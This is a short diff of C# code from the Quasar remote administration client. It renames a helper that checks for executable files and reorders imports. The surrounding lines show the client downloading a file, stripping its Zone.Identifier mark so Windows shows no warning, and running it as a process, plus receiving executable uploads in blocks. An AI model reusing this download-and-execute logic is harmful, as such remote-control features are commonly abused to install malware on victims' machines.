@@ -1,13 +1,13 @@
-﻿using System;
+﻿using Quasar.Client.Utilities;
+using Quasar.Common.Helpers;
+using Quasar.Common.IO;
+using Quasar.Common.Messages;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Threading;
 using System.Windows.Forms;
-using Quasar.Client.Helper;
-using Quasar.Client.Utilities;
-using Quasar.Common.IO;
-using Quasar.Common.Messages;
 
 namespace Quasar.Client.Commands
 {
@@ -44,7 +44,7 @@ namespace Quasar.Client.Commands
                     FileHelper.DeleteZoneIdentifier(tempFile);
 
                     var bytes = File.ReadAllBytes(tempFile);
-                    if (!FileHelper.IsValidExecuteableFile(bytes))
+                    if (!FileHelper.HasExecutableIdentifier(bytes))
                         throw new Exception("no pe file");
 
                     ProcessStartInfo startInfo = new ProcessStartInfo();
@@ -77,7 +77,7 @@ namespace Quasar.Client.Commands
 
             try
             {
-                if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !FileHelper.IsValidExecuteableFile(command.Block))
+                if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !FileHelper.HasExecutableIdentifier(command.Block))
                     throw new Exception("No executable file");
 
                 FileSplit destFile = new FileSplit(filePath);
